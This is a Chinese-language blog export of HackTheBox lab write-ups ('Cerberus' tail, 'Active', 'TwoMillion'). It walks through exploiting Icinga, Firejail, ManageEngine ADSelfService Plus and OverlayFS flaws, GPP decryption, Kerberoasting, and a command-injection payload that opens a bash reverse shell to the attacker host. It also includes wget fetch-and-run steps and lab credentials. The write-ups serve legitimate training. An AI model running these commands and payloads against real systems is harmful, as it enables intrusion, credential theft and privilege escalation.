<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230720165318755.png"></p>
<p>又找到如下文章</p>
<p><a href="https://exploit-notes.hdks.org/exploit/web/icinga-web-pentesting/">https://exploit-notes.hdks.org/exploit/web/icinga-web-pentesting/</a></p>
<p>Icinga官方配置文档：<a href="https://icinga.com/docs/icinga-web/latest/doc/03-Configuration/">https://icinga.com/docs/icinga-web/latest/doc/03-Configuration/</a></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230721092409907.png"></p>
<p>读到如下敏感信息</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230720170958055.png"></p>
<pre class="line-numbers language-none"><code class="language-none">username = "matthew"
password = "IcingaWebPassword2023"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>成功登录</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230720171136335.png"></p>
<h2 id="四、CVE-2022-24715（RCE）"><a href="#四、CVE-2022-24715（RCE）" class="headerlink" title="四、CVE-2022-24715（RCE）"></a>四、CVE-2022-24715（RCE）</h2><p>参考刚才的文章，复现远程代码执行漏洞CVE-2022-24715</p>
<p>先监听端口</p>
<pre class="line-numbers language-none"><code class="language-none">nc -lvnp 9898<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后生成PEM文件</p>
<pre class="line-numbers language-none"><code class="language-none">ssh-keygen -m pem<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230720173612744.png">

<p>执行如下命令</p>
<p>Exploit：<a href="https://github.com/JacobEbben/CVE-2022-24715/blob/main/exploit.py">https://github.com/JacobEbben/CVE-2022-24715/blob/main/exploit.py</a></p>
<pre class="line-numbers language-none"><code class="language-none">python3 CVE-2022-24715.py -t http://icinga.cerberus.local:8080/icingaweb2/ -I 10.10.14.8 -P 9898 -u matthew -p IcingaWebPassword2023 -e cert.pem<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>注：图中IP（10.10.14.35）与命令不一致是由于靶机环境不稳定，打靶期间openvpn重连过</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230721091841972.png"></p>
<p>成功反弹到shell，用户www-data，权限比较低</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230721091959388.png"></p>
<p>切换成交互式shell，便于执行命令</p>
<pre class="line-numbers language-none"><code class="language-none">python3 -c 'import pty;pty.spawn("/bin/bash")'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>本地kali开启http服务，传一个linpeas到靶机（此HTTP服务建议一直开着，后续会传好几个文件）</p>
<pre class="line-numbers language-none"><code class="language-none">python3 -m http.server 80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>靶机的shell窗口，依次执行如下命令</p>
<pre class="line-numbers language-none"><code class="language-none">cd /tmp
wget http://10.10.14.8:80/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>linpeas分析结果中，找到如下图的信息，/usr/bin/firejail不是一个常规文件</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230721112613431.png"></p>
<h2 id="五、CVE-2022-31214（Firejail本地提权）"><a href="#五、CVE-2022-31214（Firejail本地提权）" class="headerlink" title="五、CVE-2022-31214（Firejail本地提权）"></a>五、CVE-2022-31214（Firejail本地提权）</h2><p>google搜索关键字：firejail exploit</p>
<p><a href="https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25">https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25</a></p>
<p>把以上链接的代码复制到本地kali的CVE-2022-31214.py文件中，然后在靶机的shell窗口用wget从本地下载，依次执行如下命令</p>
<pre class="line-numbers language-none"><code class="language-none">wget http://10.10.14.8:80/CVE-2022-31214.py
chmod +x CVE-2022-31214.py
python3 CVE-2022-31214.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230721150903574.png"></p>
<p>在本地kali开一个新终端窗口，再弹一个shell回来，然后依次执行下列命令，成功获取root权限</p>
<pre class="line-numbers language-none"><code class="language-none">python3 -c 'import pty;pty.spawn("/bin/bash")'
firejail --join=94129	#此处94129换成对应生成的值
su -<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230721150817363.png"></p>
<p>linpeas结果中，还看到如下内容</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230721145715193.png"></p>
<p>SSSD：<a href="https://sssd.io/docs/introduction.html">https://sssd.io/docs/introduction.html</a></p>
<p>在如下目录位置查看缓存</p>
<pre class="line-numbers language-none"><code class="language-none">root@icinga:/var/lib/sss/db# strings cache_cerberus.local.ldb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">matthew@cerberus.local

$6$6LP9gyiXJCovapcy$0qmZTTjp9f2A0e7n4xk0L6ZoeKhhaCNm0VGJnX/Mu608QkliMpIy1FwKZlyUJAZU3FZ3.GQ.4N6bb9pxE3t3T0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>爆破出hash值</p>
<pre class="line-numbers language-none"><code class="language-none">john -w=/usr/share/wordlists/rockyou.txt hash.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230721154308374.png"></p>
<pre class="line-numbers language-none"><code class="language-none">147258369<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>fscan扫域控主机（172.16.22.1）端口，看到5985端口开放</p>
<pre class="line-numbers language-none"><code class="language-none">wget http://10.10.14.8:80/fscan_amd64
chmod +x fscan_amd64
./fscan_amd64 -h 172.16.22.1 -p 1-65535<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230721161820420.png"></p>
<h2 id="六、Winrm服务登录域控"><a href="#六、Winrm服务登录域控" class="headerlink" title="六、Winrm服务登录域控"></a>六、Winrm服务登录域控</h2><p>google关键词：5985端口</p>
<p>搜到Winrm服务</p>
<p>用chisel把域控主机5985端口流量转发到本地kali</p>
<p>Kali以服务端运行chisel</p>
<pre class="line-numbers language-none"><code class="language-none">chisel server -p 9899 --reverse<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>靶机以客户端运行chisel</p>
<pre class="line-numbers language-none"><code class="language-none">wget http://10.10.14.8:80/chisel
chmod +x chisel
./chisel client --max-retry-count=1 10.10.14.8:9899 R:5985:172.16.22.1:5985<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>靶机执行完上述命令后，在本地kali可看到如下界面，最后一行表示流量转发连接已建立</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230724100212322.png"></p>
<p>在本地kali用evil-winrm登录Winrm服务</p>
<pre class="line-numbers language-none"><code class="language-none">evil-winrm -i 127.0.0.1 -u matthew -p 147258369<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230724101541002.png"></p>
<p>userflag在C:\Users\matthew\Desktop目录下，依次执行如下命令成功获取userflag</p>
<pre class="line-numbers language-none"><code class="language-none">cd ../Desktop
type user.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>从本地kali传一个winPEAS到域控主机，运行一下，发现运行到一半会报错中断，也没什么有价值的</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230724103146257.png"></p>
<pre class="line-numbers language-none"><code class="language-none">./winPEASany.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在<code>C:\Program Files (x86)</code>目录看到ManageEngine服务</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230724111110674.png"></p>
<p>进到ManageEngine目录，看到ADSelfService Plus服务</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230724135943260.png"></p>
<h2 id="七、ManageEngine-ADSelfService-Plus服务提权"><a href="#七、ManageEngine-ADSelfService-Plus服务提权" class="headerlink" title="七、ManageEngine ADSelfService Plus服务提权"></a>七、ManageEngine ADSelfService Plus服务提权</h2><p>google关键字：ManageEngine ADSelfService Plus port</p>
<p>官方文档：<a href="https://www.manageengine.com/products/self-service-password/help/admin-guide/Admin/connection.html">https://www.manageengine.com/products/self-service-password/help/admin-guide/Admin/connection.html</a></p>
<p>从官方文档中看到ADSelfService Plus默认端口是8888(http)和9251(https)</p>
<p>因为有http服务，所以需要做一个socks代理</p>
<p>本地kali以服务端运行chisel</p>
<pre class="line-numbers language-none"><code class="language-none">chisel server -p 9900 --reverse<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>靶机以客户端运行chisel</p>
<pre class="line-numbers language-none"><code class="language-none">cd "C:\Users\matthew\Desktop"
curl 10.10.14.8/chisel.exe -o chisel.exe
./chisel.exe client --max-retry-count=1 10.10.14.8:9900 R:1080:socks<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>靶机运行完上述命令后，本地kali可看到如下界面，表示socks代理已建立</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230724142703206.png"></p>
<p>目前为止，建立了两条代理路线</p>
<table>
<thead>
<tr>
<th>10.10.14.8（本地kali）</th>
<th>172.16.22.1（域控主机）</th>
</tr>
</thead>
<tbody><tr>
<td>9899端口</td>
<td>5985端口（Winrm服务）</td>
</tr>
<tr>
<td>9900端口</td>
<td>1080（socks代理，为了连接9251端口服务）</td>
</tr>
</tbody></table>
<p>在本地hosts文件添加如下条目，并把最开始添加的那条10.10.11.205的记录给注释掉</p>
<pre class="line-numbers language-none"><code class="language-none">127.0.0.1    cerberus.local icinga.cerberus.local dc.cerberus.local<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>浏览器的代理插件修改代理如下</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230724150245088.png"></p>
<p>然后浏览器访问：<a href="https://dc.cerberus.local:9251，得到如下界面">https://dc.cerberus.local:9251，得到如下界面</a></p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230724150359490.png" style="zoom: 80%;">

<p>用之前获得的账号密码登录</p>
<pre class="line-numbers language-none"><code class="language-none">matthew@cerberus.local
147258369<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>登录成功是如下界面，在URL可看到guid，在F12控制台可看到请求头有一串编码</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230724151812205.png"></p>
<p>base64解码、格式化之后，得到如下代码，看到Issuer</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230724152457878.png"></p>
<p>启动MSF，搜索ADSelfService的exploit</p>
<pre class="line-numbers language-none"><code class="language-none">msfconsole
search ADSelfService<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230724155304824.png"></p>
<p>选中exploit并设置参数（注意设置socks代理）</p>
<pre class="line-numbers language-none"><code class="language-none">use exploit/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966
set GUID 67a8d101690402dc6a6744b8fc8a7ca1acf88b2f
set ISSUER_URL http://dc.cerberus.local/adfs/services/trust
set RHOSTS 172.16.22.1
set LHOST 10.10.14.8

set AutoCheck false
set ReverseAllowProxy true
set Proxies socks5:127.0.0.1:1080
run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>运行exploit，成功获取system权限</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230727083842830.png" style="zoom:80%;">

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://hackmd.io/@b3n5/rJRSRUGBn">https://hackmd.io/@b3n5/rJRSRUGBn</a></p>
<p><a href="https://blog.csdn.net/qq_58869808/article/details/129786875">https://blog.csdn.net/qq_58869808/article/details/129786875</a></p>
<p><a href="https://www.ngui.cc/article/show-1006958.html?action=onClick">https://www.ngui.cc/article/show-1006958.html?action=onClick</a></p>
]]></content>
      <categories>
        <category>靶机</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>icinga服务</tag>
        <tag>CVE-2022-24716（目录遍历）</tag>
        <tag>CVE-2022-24715（RCE）</tag>
        <tag>CVE-2022-31214（Firejail本地提权）</tag>
        <tag>winrm</tag>
        <tag>chisel代理</tag>
        <tag>MSF提权</tag>
        <tag>ManageEngine ADSelfService Plus服务</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Active</title>
    <url>/posts/79fbfa03.html</url>
    <content><![CDATA[<h1 id="HTB-Active"><a href="#HTB-Active" class="headerlink" title="HTB-Active"></a>HTB-Active</h1><h2 id="一、思路概要"><a href="#一、思路概要" class="headerlink" title="一、思路概要"></a>一、思路概要</h2><p>主要工具：</p>
<p>smbmap：查看SMB共享服务信息</p>
<p>smbclient：连接SMB服务</p>
<p>gpp-decrypt：解密主机密码</p>
<p>impacket-GetUserSPNs：获取SPN信息</p>
<p>impacket-psexec：登录主机，获取shell</p>
<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><p>nmap扫端口服务</p>
<pre class="line-numbers language-none"><code class="language-none">nmap -p- --min-rate 10000 -Pn -sT 10.10.10.100<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230802110837445.png"></p>
<pre class="line-numbers language-none"><code class="language-none">nmap -A 10.10.10.100<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230802140113949.png"></p>
<p>用smbmap查看SMB共享服务</p>
<pre class="line-numbers language-none"><code class="language-none">smbmap -H 10.10.10.100<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230802140644696.png"></p>
<p>SMB共享出来的Replication目录有只读权限，用smbclient匿名连接一下</p>
<pre class="line-numbers language-none"><code class="language-none">smbclient //10.10.10.100/Replication -N<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230802140709205.png"></p>
<p>在如下目录，找到Groups.xml文件，没法直接读，尝试把它下载到本地kali（Groups.xml作用可以理解为域内主机的配置文件）</p>
<pre class="line-numbers language-none"><code class="language-none">cd active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230802140927879.png"></p>
<p>smb连接窗口执行如下命令</p>
<pre class="line-numbers language-none"><code class="language-none">get Groups.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>本地kali执行如下命令</p>
<pre class="line-numbers language-none"><code class="language-none">cat Groups.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230802144025973.png"></p>
<p>看到主机用户和密码，用gpp-decrypt解密</p>
<pre class="line-numbers language-none"><code class="language-none">gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230802144435689.png"></p>
<pre class="line-numbers language-none"><code class="language-none">GPPstillStandingStrong2k18<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>尝试以admin用户连接smb服务，失败</p>
<pre class="line-numbers language-none"><code class="language-none">smbclient -W 10.10.10.100 -U SVC_TGS //10.10.10.100/ADMIN$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230802145514833.png"></p>
<p>以普通用户连接smb服务，成功</p>
<pre class="line-numbers language-none"><code class="language-none">smbclient -W 10.10.10.100 -U SVC_TGS //10.10.10.100/USERS<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230802145547014.png"></p>
<p>读user.txt</p>
<pre class="line-numbers language-none"><code class="language-none">cd SVC_TGS\Desktop\
get user.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h2 id="三、权限提升"><a href="#三、权限提升" class="headerlink" title="三、权限提升"></a>三、权限提升</h2><p>用如下命令获取SPN成功</p>
<pre class="line-numbers language-none"><code class="language-none">impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230802151639024.png"></p>
<p>数据是john可以爆破的格式，直接john爆破，得Administrator密码</p>
<pre class="line-numbers language-none"><code class="language-none">john --wordlist=/usr/share/wordlists/rockyou.txt SPN.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230802151922988.png"></p>
<p>用Administrator账户登录主机，成功获取system权限</p>
<pre class="line-numbers language-none"><code class="language-none">impacket-psexec active.htb/Administrator:Ticketmaster1968@10.10.10.100<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230802152149422.png"></p>
<p>读root.txt，Over！</p>
<pre class="line-numbers language-none"><code class="language-none">type C:\Users\Administrator\Desktop\root.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230802152447938.png"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/active-writeup-w-o-metasploit">https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/active-writeup-w-o-metasploit</a></p>
]]></content>
      <categories>
        <category>靶机</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>impacket</tag>
        <tag>windows</tag>
        <tag>SMB服务</tag>
        <tag>SPN信息</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-TwoMillion</title>
    <url>/posts/feb24f25.html</url>
    <content><![CDATA[<h1 id="HTB-TwoMillion"><a href="#HTB-TwoMillion" class="headerlink" title="HTB-TwoMillion"></a>HTB-TwoMillion</h1><h2 id="一、思路概要"><a href="#一、思路概要" class="headerlink" title="一、思路概要"></a>一、思路概要</h2><p>1.主站邀请码注册功能页面js文件发现可用API；</p>
<p>2.通过API获得邀请码注册用户并登录；</p>
<p>3.发现admin认证的API泄露；</p>
<p>4.通过API实现越权，并且发现命令执行漏洞；</p>
<p>5.命令执行反弹shell获取www-data权限；</p>
<p>6.邮件信息泄露，用CVE-2023-0386（OverlayFS提权）获取root权限。</p>
<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><p>nmap扫描</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828100355909.png"></p>
<p>端口很简单，但得到一个域名，域名写入本地hosts文件</p>
<pre class="line-numbers language-none"><code class="language-none">echo "10.10.11.221 2million.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>浏览器访问</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828101902128.png"></p>
<p>下滑，有个如下join的界面</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828101928607.png" style="zoom: 80%;">

<p>点击<code>Join HTB</code>，进入如下界面，需要输入邀请码</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828102944481.png"></p>
<p>查看页面源码，发现验证码正确后会跳转到<code>/register</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828103644181.png"></p>
<p>直接访问<code>/register</code>，访问成功，但是没有邀请码还是无法注册</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828103710738.png" style="zoom:80%;">

<p>刚刚邀请码页面的源码有个<code>/js/inviteapi.min.js</code>文件，用<a href="https://beautifier.io/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%BE%97%E5%88%B0%E5%A6%82%E4%B8%8B%E4%BB%A3%E7%A0%81">https://beautifier.io/格式化得到如下代码</a></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828104417503.png"></p>
<p>有两个API，curl访问<code>2million.htb/api/v1/invite/how/to/generate</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828104757966.png"></p>
<p>有一段data是ROT13编码，转换如下</p>
<pre class="line-numbers language-none"><code class="language-none">Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr
ROT13转换后：
In order to generate the invite code, make a POST request to /api/v1/invite/generate<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>又得到一个API，看API名字像是生成邀请码，curl访问<code>2million.htb/api/v1/invite/generate</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828105141164.png"></p>
<p>有一段像base64的编码，解码如下，得到邀请码</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root💀kali)-[~/Desktop]
└─# echo "MVRJVE0tUkxGVFktVzFDT1AtQ0RCOVQ=" | base64 -d  
1TITM-RLFTY-W1COP-CDB9T<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>返回输入邀请码的界面<code>/invite</code>，输入邀请码后注册用户</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828105704156.png" style="zoom:80%;">

<p>注册成功后会跳转到登录页面，登录进入如下界面</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828110037440.png" style="zoom: 67%;">

<p>在左侧<code>Labs</code>→<code>Access</code>界面，如下</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828110628271.png" style="zoom: 67%;">

<p>审查元素，看到有API</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828110738917.png"></p>
<p>浏览器访问<code>/api</code>目录，看有没有API泄露，看到<code>/api/v1</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828110821701.png"></p>
<p>再访问<code>/api/v1</code>，泄露了API</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828110855905.png"></p>
<h2 id="三、API越权"><a href="#三、API越权" class="headerlink" title="三、API越权"></a>三、API越权</h2><p>user的就不管了，直接尝试访问admin的API，GET访问<code>/api/v1/admin/auth</code>，返回false</p>
<pre class="line-numbers language-none"><code class="language-none">GET /api/v1/admin/auth<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828112229587.png"></p>
<p>POST访问<code>/api/v1/admin/vpn/generate</code>，返回401未认证响应码</p>
<pre class="line-numbers language-none"><code class="language-none">POST /api/v1/admin/vpn/generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828112148644.png"></p>
<p>PUT访问<code>/api/v1/admin/settings/update</code>，返回<code>Invalid content type</code></p>
<pre class="line-numbers language-none"><code class="language-none">PUT /api/v1/admin/settings/update<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828112312680.png"></p>
<p>那就修改请求包<code>Content-Type</code>字段值为json格式再次访问，提示没有<code>email</code>参数</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828112436580.png"></p>
<p>在请求包数据部分用json格式设置email参数再次访问，提示没有<code>is_admin</code>参数</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828112558648.png"></p>
<p>再设置<code>is_admin</code>参数，又提示<code>is_admin</code>参数需要是0或1</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828112706098.png"></p>
<p>设置<code>is_admin</code>参数值为1，注意不能用引号，又提示email没找到</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828112837405.png"></p>
<p>设置email为刚注册的eamil，返回用户数据，应该是认证成功了</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828112906482.png"></p>
<p>再GET访问<code>/api/v1/admin/auth</code>，message变为true</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828113050824.png"></p>
<p>再POST访问<code>/api/v1/admin/vpn/generate</code>，依旧是按照响应包提示，修改请求包的<code>Content-Type</code>字段和数据部分，得到如下响应，生成了vpn连接的凭据，然后发现这个位置有个命令执行，username字段值应该是直接被拼接到linux的shell命令中了，类似于<code>generate_vpn.sh [username]</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828130831787.png"></p>
<h2 id="四、命令执行"><a href="#四、命令执行" class="headerlink" title="四、命令执行"></a>四、命令执行</h2><p>修改请求中的username字段值如下，注意命令和注释符<code>#</code>之间需要有个空格，执行命令成功</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828132348031.png"></p>
<p>于是用如下请求数据反弹shell</p>
<pre class="line-numbers language-none"><code class="language-none">{"username":"wa0er;bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.7/9898 0&gt;&amp;1' #"}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>本地监听，成功反弹</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828140143981.png"></p>
<p>在当前目录的环境变量文件<code>.env</code>找到admin用户密码</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828141213435.png"></p>
<pre class="line-numbers language-none"><code class="language-none">DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>尝试发现，既可shell登录，也可ssh登录</p>
<p>shell登录</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828141659786.png"></p>
<p>ssh登录</p>
<pre class="line-numbers language-none"><code class="language-none">ssh admin@10.10.11.221<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828142519715.png"></p>
<p>ssh登录发现有个提示<code>You have mail</code>，用<code>find / -name 'mail' 2&gt;/dev/null</code>查找名字为<code>mail</code>的文件或目录，然后在<code>/var/mail/admin</code>文件中找到一封邮件</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828143317099.png"></p>
<p>提示有Linux内核的CVE，关键词OverlayFS / FUSE</p>
<h2 id="五、CVE-2023-0386（OverlayFS提权）"><a href="#五、CVE-2023-0386（OverlayFS提权）" class="headerlink" title="五、CVE-2023-0386（OverlayFS提权）"></a>五、CVE-2023-0386（OverlayFS提权）</h2><p>google搜索关键字：OverlayFS / FUSE exploit</p>
<p>漏洞分析：<a href="https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/">https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/</a></p>
<p>exploit：<a href="https://github.com/xkaneiki/CVE-2023-0386/">https://github.com/xkaneiki/CVE-2023-0386/</a></p>
<p>本地下载exploit，然后用wget传到目标靶机</p>
<p>本地开启http服务</p>
<pre class="line-numbers language-none"><code class="language-none">python3 -m http.server 80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>目标靶机下载、解压、编译、执行</p>
<pre class="line-numbers language-none"><code class="language-none">cd /tmp
wget http://10.10.14.7/CVE-2023-0386-main.zip
unzip CVE-2023-0386-main.zip
cd CVE-2023-0386-main
make all	#编译有报错，不影响
./fuse ./ovlcap/lower ./gc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828145832655.png"></p>
<p>另开一个终端连接ssh，到<code>/tmp/CVE-2023-0386-main</code>目录下执行<code>./exp</code>，成功获取root权限</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828150040778.png"></p>
